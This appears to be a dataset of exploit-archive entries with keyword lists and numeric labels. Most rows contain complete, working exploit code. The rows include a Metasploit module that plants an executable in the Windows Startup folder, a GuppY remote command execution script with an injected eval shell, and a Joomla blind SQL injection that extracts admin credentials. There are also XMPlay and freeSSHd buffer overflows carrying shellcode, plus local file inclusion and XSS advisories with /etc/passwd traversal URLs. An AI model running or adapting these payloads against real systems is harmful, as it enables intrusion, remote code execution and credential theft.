16605,"Snapshot Viewer for Microsoft Access - ActiveX Control Arbitrary File Download (Metasploit) ## # $Id: ms08_041_snapshotviewer.rb 10394 2010-09-20 08:06:27Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Snapshot Viewer for Microsoft Access ActiveX Control Arbitrary File Download', 			'Description'    => %q{ 					This module allows remote attackers to place arbitrary files on a users file system 				via the Microsoft Office Snapshot Viewer ActiveX Control. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision: 10394 $', 			'References'     => 				[ 					[ 'CVE', '2008-2463' ], 					[ 'OSVDB', '46749'], 					[ 'MSB', 'MS08-041' ], 					[ 'BID', '30114' ], 				], 			'Payload'        => 				{ 					'Space'           => 2048, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Jul 07 2008'))  		register_options( 			[ 				OptString.new('PATH', [ true, 'The path to place the executable.', 'C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\']), 			], self.class) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request)  		payload_url =  ""http://"" 		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		payload_url += "":"" + datastore['SRVPORT'] + get_resource() + ""/payload""  		if (request.uri.match(/payload/)) 			return if ((p = regenerate_payload(cli)) == nil) 			data = generate_payload_exe({ :code => p.encoded }) 			print_status(""Sending EXE payload to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 			return 		end  		vname  = rand_text_alpha(rand(100) + 1) 		exe    = rand_text_alpha(rand(20) + 1)  		content = %Q| 		<html> 		<head> 			<script> 			try { 				var #{vname} = new ActiveXObject('snpvw.Snapshot Viewer Control.1'); 				#{vname}.SnapshotPath = ""#{payload_url}""; 				#{vname}.CompressedPath = ""#{datastore['PATH']}\\#{exe}.exe""; 				#{vname}.PrintSnapshot(); 			} catch( e ) { window.location = 'about:blank' ; } 			</script> 		</head> 		</html> 				|  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		send_response_html(cli, content)  		handler(cli)  	end  end",['ActiveX'],0
3221,"GuppY 4.5.16 - Remote Command Execution <?php print_r(' --------------------------------------------------------------------------- Guppy <= 4.5.16 remote commands execution exploit by rgod mail: retrog at alice dot it site: http://retrogod.altervista.org dork: ""Site powered by GuppY"" | ""Site créé avec GuppY"" +inurl:lng= --------------------------------------------------------------------------- '); /*  works regardless of php.ini settings */ if ($argc<4) {     print_r(' --------------------------------------------------------------------------- Usage: php '.$argv[0].' host path cmd OPTIONS host:      target server (ip/hostname) path:      path to guppy cmd:       a shell command Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost /guppy/ ls -la -P1.1.1.1:80 php '.$argv[0].' localhost / cat ./admin/mdp.php -p81 --------------------------------------------------------------------------- ');     die; } error_reporting(7); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';  function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; $cmd=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>'-p') and ($temp<>'-P')) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}   //this shell should work with magic_quotes_gpc = off //$shell=urlencode('"";eval(base64_decode(""'.base64_encode(""set_time_limit(0);echo \""my_delim\"";passthru(\$_SERVER[HTTP_SUNTZU]);"").'""));die;//');  //but I know another method to bypaas magic quotes inside escaped strings:  $shell='$suntzu{$suntzoi{error_reporting(7)}}$suntzu{$suntzoi{set_time_limit(0)}}$suntzu{$suntzoi{print(my_delim)}}$suntzu{$suntzoi{passthru($_SERVER[HTTP_SUNTZU])}}$suntzu{$suntzoi{die()}}'; /* our inc file becomes like this:  <?php $err = ""999""; $msg0 = ""$suntzu{$suntzoi{error_reporting(0)}}$suntzu{$suntzoi{set_time_limit(0)}}$suntzu{$suntzoi{print(my_delim)}}$suntzu{$suntzoi{passthru($_SERVER[HTTP_SUNTZU])}}$suntzu{$suntzoi{die()}}""; $msg1 = """"; $msg2 = """"; $date = ""Date : 29/01/2007 13:36""; $dest = ""Page requested : /guppo/error.php?err=999""; $source = ""Page source : ""; $browser = ""Browser : ""; $addr_ip = ""IP address : 192.168.1.3""; $domaine = ""Domaine : GOD""; $with_mail = false; ?>  funny, isn't it? ;) */  //$REMOTE_ADDR injection works with register_globals = off because of an extract() (patch from previous version does not work) //$msg[err][0] injection works with register_globals = on  //so this totally bypass php.ini settings  //I want to say that I submitted it to the programmer one year ago, but he said that I am a *bastard evil hacker* or something :D  $data =""-----------------------------7d61bcd1f033e\r\n""; $data.=""Content-Disposition: form-data; name=\""err\"";\r\n\r\n""; $data.=""999\r\n""; $data.=""-----------------------------7d61bcd1f033e--\r\n""; $packet =""POST "".$p.""error.php?err=999 HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Cookie: REMOTE_ADDR=1.1.1.1$shell; msg[999][0]=$shell;\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); $temp=explode(""error.php?id="",$html); $temp2=explode(""\n"",$temp[1]); $id=trim($temp2[0]); echo ""id -> "".$id.""\n""; if ($id==""""){   if (eregi(""supplied argument is not a valid stream resource"",$html)){      echo ""it seems that data/ folder has no proper permissions\n"";   } echo $html;die; } sleep(1); echo ""cmd -> "".$cmd.""\n\n""; //arbitrary local inclusion as usual for .inc files in id argument $data =""-----------------------------7d61bcd1f033e\r\n""; $data.=""Content-Disposition: form-data; name=\""id\"";\r\n\r\n""; $data.=""$id\r\n""; $data.=""-----------------------------7d61bcd1f033e--\r\n""; $packet =""POST "".$p.""error.php HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n""; $packet.=""SUNTZU: "".trim($cmd).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); if (eregi(""Cannot set time limit in safe mode"",$html)) {   echo ""exploit succeeded, but safe mode on\n""; } elseif (eregi(""my_delim"",$html)){     $temp=explode(""my_delim"",$html);     echo $temp[1]; } else {   echo ""exploit failed...see html...\n"";   echo $html; } ?>  # milw0rm.com [2007-01-29]",['php.ini'],1
8731,"Joomla! Component com_gsticketsystem - 'catid' Blind SQL Injection <?php ini_set(""max_execution_time"",0); print_r(' ############################################################################## # #         Joomla com_gsticketsystem (catid) Blind SQL Injection Exploit # #                             ===  Cyb3R-1sT  === #                        cyb3r-1st [at] hormail.com #                               inject0r5 t3am  # #                                  : Usage : # php file.php ""http://site/index.php?option=com_gsticketsystem&controller=entrypoint&task=viewCategory&catid=2"" # #                                : Sp.GrEetZ : #       [ All friends ] & [ 7rs.org ] & [ tryag.com] & [ sec-code.com ]  # ############################################################################## '); if ($argc > 1) { $url = $argv[1]; $r = strlen(file_get_contents($url.""+and+1=1--"")); echo ""\nExploiting:\n""; $w = strlen(file_get_contents($url.""+and+1=0--"")); $t = abs((100-($w/$r*100))); echo ""Username: ""; for ($i=1; $i <= 30; $i++) { $laenge = strlen(file_get_contents($url.""+and+ascii(substring((select+username+from+jos_users+limit+0,1),"".$i."",1))!=0--""));    if (abs((100-($laenge/$r*100))) > $t-1) {       $count = $i;       $i = 30;    } } for ($j = 1; $j < $count; $j++) {    for ($i = 46; $i <= 122; $i=$i+2) {       if ($i == 60) {          $i = 98;       }       $laenge = strlen(file_get_contents($url.""+and+ascii(substring((select+username+from+jos_users+limit+0,1),"".$j."",1))%3E"".$i.""--""));       if (abs((100-($laenge/$r*100))) > $t-1) {          $laenge = strlen(file_get_contents($url.""+and+ascii(substring((select+username+from+jos_users+limit+0,1),"".$j."",1))%3E"".($i-1).""--""));          if (abs((100-($laenge/$r*100))) > $t-1) {             echo chr($i-1);          } else {             echo chr($i);          }          $i = 122;       }    } } echo ""\nPassword: ""; for ($j = 1; $j <= 49; $j++) {    for ($i = 46; $i <= 102; $i=$i+2) {       if ($i == 60) {          $i = 98;       }       $laenge = strlen(file_get_contents($url.""+and+ascii(substring((select+password+from+jos_users+limit+0,1),"".$j."",1))%3E"".$i.""--""));       if (abs((100-($laenge/$r*100))) > $t-1) {          $laenge = strlen(file_get_contents($url.""+and+ascii(substring((select+password+from+jos_users+limit+0,1),"".$j."",1))%3E"".($i-1).""--""));          if (abs((100-($laenge/$r*100))) > $t-1) {             echo chr($i-1);          } else {             echo chr($i);          }          $i = 102;       }    } } }  ?>  # milw0rm.com [2009-05-19]","[""'catid'""]",1
6301,"EZContents CMS 2.0.3 - Multiple Local File Inclusions Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-038   Application:                    ezContents CMS Versions Affected:              2.0.3 Application URL:                http://www.ezcontents.org/ Vendor URL:                     http://www.visualshapers.com/ Bug:                            Multiple Local File Include Exploits:                       YES Reported:                       05.08.2008 Second report:                  18.08.2008 Vendor Response:                NONE Solution:                       NONE Date of Public Advisory:        25.08.2008 Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)    Description ***********  ezContents CMS has Multiple Local File Include vulnerabilities.     Details *******  1. Local File Include vulnerability found in script /module.php  Vulnerable GET parameter ""link"".  First discovered by Zero_X [http://secunia.com/advisories/10604/]. Vendor fixed vulnerability in version 2.0.3 by adding verification for this parameter.  However, attacker still can include local files.  Code [line 32-42, 141-145] -------------------------- #################################################  $GLOBALS[""rootdp""] = './'; require_once ($GLOBALS[""rootdp""].""include/config.php""); require_once ($GLOBALS[""rootdp""].""include/db.php""); require_once ($GLOBALS[""rootdp""].""include/session.php""); include_once ($GLOBALS[""rootdp""].$GLOBALS[""modules_home""].""modfunctions.php"");   if ((!isset($HTTP_GET_VARS[""ezSID""])) && (isset($HTTP_POST_VARS[""ezSID""]))) $HTTP_GET_VARS[""ezSID""] = $HTTP_POST_VARS[""ezSID""]; if ((!isset($HTTP_GET_VARS[""link""])) && (isset($HTTP_POST_VARS[""link""])))  $HTTP_GET_VARS[""link""] = $HTTP_POST_VARS[""link""];  $HTTP_GET_VARS[""link""] = str_replace('../', '', $HTTP_GET_VARS[""link""]);  ...  if (isExternalLink ($HTTP_GET_VARS[""link""])) {         ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents'; } else {         include($GLOBALS[""rootdp""].$HTTP_GET_VARS[""link""]); }  #################################################  isExternalLink() function in script /include/functions.php checks for remote inclusion attempts.    Code [line 768-779] ------------------- #################################################  function isExternalLink ($linkref) {         if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||                  (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||                  (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||                  (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||                  (substr($linkref,0,5) == 'wais:') ) {                  return True;         } else {                  return False;         } } // isExternalLink  #################################################  Example:  http://[server]/[installdir]/module.php?link=....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd   2. Local File Include vulnerabilities found in scripts  /modules/diary/showdiary.php /modules/diary/showeventlist.php /modules/gallery/showgallery.php /modules/reviews/showreviews.php  Successful exploitation requires that ""register_globals"" is enabled.  Code [showdiary.php, line 32-45] -------------------------------- #################################################  global $HTTP_SERVER_VARS; if ( (substr($HTTP_SERVER_VARS[""PHP_SELF""],-11) == 'control.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-10) == 'module.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-16) == 'showcontents.php') ) {          require_once('./modules/moduleSec.php'); } else {         require_once('../moduleSec.php'); }  $GLOBALS[""ModuleName""] = 'diary';  if (!isset($GLOBALS[""gsLanguage""])) { Header(""Location: "".$GLOBALS[""rootdp""].""module.php?link="".$GLOBALS[""modules_home""].$GLOBALS[""ModuleRef""].""/showdiary.php""); } include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_admin.php""); include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_main.php"");  #################################################  Script /modules/moduleSec.php checks for inclusion attempts.  Code ---- #################################################  function moduleExternalLink ($linkref) {         if ($linkref != '') {                 if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||                          (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||                          (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||                          (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||                          (substr($linkref,0,5) == 'wais:') ) {                          return True;                 } else {                         return False;                 }         } else {                 return False;         } } // moduleExternalLink   if (!(isset($GLOBALS[""rootdp""]))) {          ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';          DIE; } if ( (moduleExternalLink($GLOBALS[""rootdp""])) || (moduleExternalLink($GLOBALS[""modfiledir""])) ||          (moduleExternalLink($GLOBALS[""modules_home""])) || (moduleExternalLink($GLOBALS[""admin_home""])) ||          (moduleExternalLink($GLOBALS[""language_home""])) ) {          ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';          DIE; }  #################################################  Example:  http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00 http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&gsLanguage=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00   3. Local File Include vulnerabilities found in scripts  /modules/diary/showdiarydetail.php /modules/gallery/showgallerydetails.php /modules/reviews/showreviewsdetails.php /modules/news/shownewsdetails.php  Successful exploitation requires that ""register_globals"" is enabled.  Code [showdiarydetail.php, line 32-46] -------------------------------------- #################################################  global $HTTP_SERVER_VARS; if ( (substr($HTTP_SERVER_VARS[""PHP_SELF""],-11) == 'control.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-10) == 'module.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-16) == 'showcontents.php') ) {          require_once('./modules/moduleSec.php'); } else {         require_once('../moduleSec.php'); }  $GLOBALS[""ModuleName""] = 'diary';  include_once ($GLOBALS[""admin_home""].""compile.php"");  include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_admin.php""); include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_main.php"");  #################################################  Example:  http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&admin_home=../../../../../../../../../../../../../etc/passwd%00 http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00 http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00   4. Local File Include vulnerabilities found in scripts  /modules/diary/submit_diary.php /modules/gallery/submit_gallery.php /modules/guestbook/submit_guestbook.php /modules/reviews/submit_reviews.php /modules/news/submit_news.php  Successful exploitation requires that ""register_globals"" is enabled.  Code [submit_diary.php, line 32-51] ----------------------------------- #################################################  global $HTTP_SERVER_VARS; if ( (substr($HTTP_SERVER_VARS[""PHP_SELF""],-11) == 'control.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-10) == 'module.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-16) == 'showcontents.php') ) {          require_once('./modules/moduleSec.php'); } else {         require_once('../moduleSec.php'); }  // Localisation variables (used for default values) // Change these to suit your site preferences // $expiryperiod = 'm';                    // Time period to calculate the banner expiry date (based on today's date) $expirynumber = 1;   $GLOBALS[""ModuleName""] = 'diary';  include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_admin.php""); include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_main.php"");  #################################################  Example:  http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00 http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00   5. Local File Include vulnerabilities found in scripts  /modules/news/archivednews_summary.php /modules/news/news_summary.php  Successful exploitation requires that ""register_globals"" is enabled.  Code [news_summary.php, line 32-41] ----------------------------------- #################################################  global $HTTP_SERVER_VARS; if ( (substr($HTTP_SERVER_VARS[""PHP_SELF""],-11) == 'control.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-10) == 'module.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-16) == 'showcontents.php') ) {          require_once('./modules/moduleSec.php'); } else {         require_once('../moduleSec.php'); }  include_once ($GLOBALS[""admin_home""].""compile.php"");  #################################################  Example:  http://[server]/[installdir]/modules/news/news_summary.php?rootdp=DSecRG&admin_home=../../../../../../../../../../../../../etc/passwd%00   6. Local File Include vulnerabilities found in scripts  /modules/diary/inlineeventlist.php /modules/news/inlinenews.php  Successful exploitation requires that ""register_globals"" is enabled.  Code [inlinenews.php, line 32-52] --------------------------------- #################################################  global $HTTP_SERVER_VARS; if ( (substr($HTTP_SERVER_VARS[""PHP_SELF""],-11) == 'control.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-10) == 'module.php') ||          (substr($HTTP_SERVER_VARS[""PHP_SELF""],-16) == 'showcontents.php') ) {          require_once('./modules/moduleSec.php'); } else {         require_once('../moduleSec.php'); }  global $EZ_SESSION_VARS;  $GLOBALS[""ModuleName""] = 'news';  $linkref = $nLink; $chainlink = explode('/',$linkref); $modfilename = array_pop($chainlink); $GLOBALS[""modfiledir""] = implode('/',$chainlink); include($GLOBALS[""modfiledir""].""/moduleref.php"");  include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_admin.php""); include_once ($GLOBALS[""language_home""].$GLOBALS[""gsLanguage""].""/lang_main.php"");  #################################################  Example:  http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&nLink=../../../../../../../../../../../../../etc/passwd%00/ http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00 http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:    research [at] dsec [dot] ru             http://www.dsec.ru (in Russian)  # milw0rm.com [2008-08-25]","['module.php ', 'functions.php ', 'showdiary.php,', 'inlinenews.php,']",1
2815,"XMPlay 3.3.0.4 - '.M3U' Filename Local Buffer Overflow /* =================================================================== 	0-day XMPlay 3.3.0.4 .M3U Filename Buffer Overflow Exploit =================================================================== XMPlay 3.3.0.4 and lower experiance a stack-based buffer overflow when loading malformed M3U files (probably PLS and ASX files as well).  This merely executes CALC.exe but you could always add your own custom shellcode (alpha2)  Either the DisplayName field of the M3U or the FileName field can be used to exploit the system, but during my tests, using the DisplayName field caused Windows DEP to activate.  (English Windows XP SP2)  Huge Greets and Thanks to Expanders (expanders[at]gmail[dot]com) Who I presented the PoC and Discovery to, and he wrote the first PoC Exploit for it.  And Jerome Athias for some neat tools.  Both of these guys are very talented, keep up the good work.  Someone should try this with ASX and PLS files, i bet it works as well. Reported Exploit Date: 11/20/2006  */   #include <stdio.h> #include <stdlib.h> #include <string.h> int main(int argc, char *argv[]) {  	FILE * Exploit; 	char buffer[512];  	/* Executes Calc.exe Alpha2 Shellcode Provided by Expanders <expanders[at]gmail[dot]com> */ 	unsigned char scode[] = 	""TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"" 	""YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM"" 	""5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp"" 	""LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip"" 	""sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA"";    	char NOPSled[20]; 	char tail[] = "".mid\r\n""; 	char Overflow[5000]; 	int i, JMP;  	printf(""\n==============================================================\n""); 	printf(""XMPlay 3.3.0.4 and prior M3U Filename Buffer Overflow Exploit\n""); 	printf(""Discovered By: Greg Linares <GLinares.code[at]gmail[dot]com>\n""); 	printf(""Original PoC coded by: Expanders <expanders[at]gmail[dot]com>\n\n""); 	printf(""Usage: %s, <output M3U file> <JMP> [M3U Display Name]\n"", argv[0]); 	printf(""\n JMP Options\n""); 	printf(""1 = English Windows XP SP 2 User32.dll <JMP ESP 0x77db41bc>\n""); 	printf(""2 = English Windows XP SP 1 User32.dll <JMP ESP 0x77d718fc>\n""); 	printf(""3 = English Windows 2003 SP0 and SP1 User32.dll <JMP ESP 0x77d74adc>\n""); 	printf(""4 = English Windows 2000 SP 4 User32.dll  <JMP ESP 0x77e3c256>\n""); 	printf(""================================================================\n\n\n"");   	if (argc < 2) { 		printf(""Invalid Number Of Arguments\n""); 		return 1; 	}   	Exploit = fopen(argv[1],""w"");     if ( !Exploit )     {         printf(""\nCouldn't Open File!"");         return 1;     } 	memset(Overflow, 0, 5000); 	memset(buffer, 0, 505); 	memset(NOPSled, 0, 20); 	fputs(""#EXTM3U\r\n"", Exploit); 	if (strlen(argv[3]) > 0) { 		fputs(""#EXTINF:0,"", Exploit); 		fputs(argv[3], Exploit); 		fputs(""\r\n"", Exploit); 	} else { 		fputs(""#EXTINF:0,XMPlay_0-Day_Buffer_Overflow_Exploit_By_Greg_Linares_and_Expanders\r\n"", Exploit); 	}  	fputs(""C:\\"", Exploit);  	for (i=0;i<505;i++) { 		strcat(buffer, ""A""); 	}  	fputs(buffer, Exploit); 	if (atoi(argv[2]) <= 0) { 		JMP = 1; 	} else if (atoi(argv[2]) > 4) { 		JMP = 1; 	} else { 		JMP = atoi(argv[2]); 	} 	switch(JMP) { 		case 1: 			printf(""Using English Windows XP SP2 JMP...\n""); 			fputs(""\xbc\x41\xdb\x77"", Exploit); 			break; 		case 2: 			printf(""Using English Windows XP SP1 JMP...\n""); 			fputs(""\xfc\x18\xd7\x77"", Exploit); 			break; 		case 3: 			printf(""Using English Windows 2003 SP0 & SP1 JMP...\n""); 			fputs(""\xdc\x4a\xd7\x77"", Exploit); 			break; 		case 4: 			printf(""Using English Windows 2000 SP 4 JMP...\n""); 			fputs(""\x56\xc2\xe3\x77"", Exploit); 			break; 	}  	fputs(scode, Exploit);  	for (i=0;i<20;i++) { 		strcat(NOPSled, ""\x90""); 	} 	fputs(NOPSled, Exploit); 	fputs(tail, Exploit);    	printf(""Exploit Succeeded...\n Output File: %s\n\n"", argv[1]); 	printf(""Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n""); 	printf(""Greetz to: Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n"");  	fclose(Exploit); 	return 0; }  // milw0rm.com [2006-11-20]",['M3U'],0
8295,"freeSSHd 1.2.1 - 'rename' Remote Buffer Overflow (SEH) # FreeSSHd 1.2.1 (rename) Remote Buffer Overflow Exploit # # Advisory: http://www.bmgsec.com.au/advisory/45/ # Original: http://www.bmgsec.com.au/advisory/32/ # Related : http://www.bmgsec.com.au/advisory/42/ # # Test box: WinXP Pro SP2 English # # Exploit code for a vulnerability I discovered sometime # ago in FreeSSHd 1.2.1. This code should be run from a  # user titled ""root"", or adjust the payload for your  # username. I've left space for adjustments. Up to the # first six NOPs can be used (inclusive).  # # The code exploits a vulnerability in the SFTP Rename # operation. The vulnerability was patched in 1.2.2 # # 00416F98  50             PUSH EAX                       # 00416F99  8D85 B8FEFFFF  LEA EAX,DWORD PTR SS:[EBP-148] # 00416F9F  50             PUSH EAX                       # 00416FA0  E8 45B50400    CALL <JMP.&MSVCRT.strcpy>      # # # Written and discovered by: # r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)  use Net::SSH2;  my $user = ""root""; my $pass = ""yahh"";  my $ip = ""127.0.0.1""; my $port = 22;  my $ssh2 = Net::SSH2->new();  print ""[+] Connecting...\n""; $ssh2->connect($ip, $port) || die ""[-] Unable to connect!\n""; $ssh2->auth_password($user, $pass) || ""[-] Incorrect credentials\n""; print ""[+] Sending payload\n"";  $nop = ""\x90""; $padding = 'A' x 105;  my $SEH = ""\x21\x11\x40\x00""; # pop, pop, ret - 0x00401121 (Universal - freeSSHdServer.exe) my $nextSEH = ""\xEB\xF0\x90\x90""; # jmp short 240, nop, nop  $mShellcode = ""\xE9\xF2\xFE\xFF\xFF"";  # win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub - metasploit.com my $shellcode = ""\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"". ""\x28\x29\x10\x83\xeb\xfc\xe2\xf4\xfe\xc0\x6d\x10\x02\x28\xa2\x55"". ""\x3e\xa3\x55\x15\x7a\x29\xc6\x9b\x4d\x30\xa2\x4f\x22\x29\xc2\x59"". ""\x89\x1c\xa2\x11\xec\x19\xe9\x89\xae\xac\xe9\x64\x05\xe9\xe3\x1d"". ""\x03\xea\xc2\xe4\x39\x7c\x0d\x14\x77\xcd\xa2\x4f\x26\x29\xc2\x76"". ""\x89\x24\x62\x9b\x5d\x34\x28\xfb\x89\x34\xa2\x11\xe9\xa1\x75\x34"". ""\x06\xeb\x18\xd0\x66\xa3\x69\x20\x87\xe8\x51\x1c\x89\x68\x25\x9b"". ""\x72\x34\x84\x9b\x6a\x20\xc2\x19\x89\xa8\x99\x10\x02\x28\xa2\x78"". ""\x3e\x77\x18\xe6\x62\x7e\xa0\xe8\x81\xe8\x52\x40\x6a\x56\xf1\xf2"". ""\x71\x40\xb1\xee\x88\x26\x7e\xef\xe5\x4b\x48\x7c\x61\x28\x29\x10"";  my $payload = $nop x 6 . $shellcode . $padding . $mShellcode . $nop x 9 . $nextSEH . $SEH;  my $sftp = $ssh2->sftp(); $sftp->rename($payload, 'B');  print ""[+] Sent""; $ssh2->disconnect;  # milw0rm.com [2009-03-27]","[""'rename'""]",1
27804,321soft PHP-Gallery 0.9 - 'index.php?path' Cross-Site Scripting source: https://www.securityfocus.com/bid/17812/info   PhP-Gallery is prone to an information-disclosure vulnerability and a cross-site scripting vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.    An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the affected application or to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/index.php?path=[XSS],"[""'index.php?path'""]",1
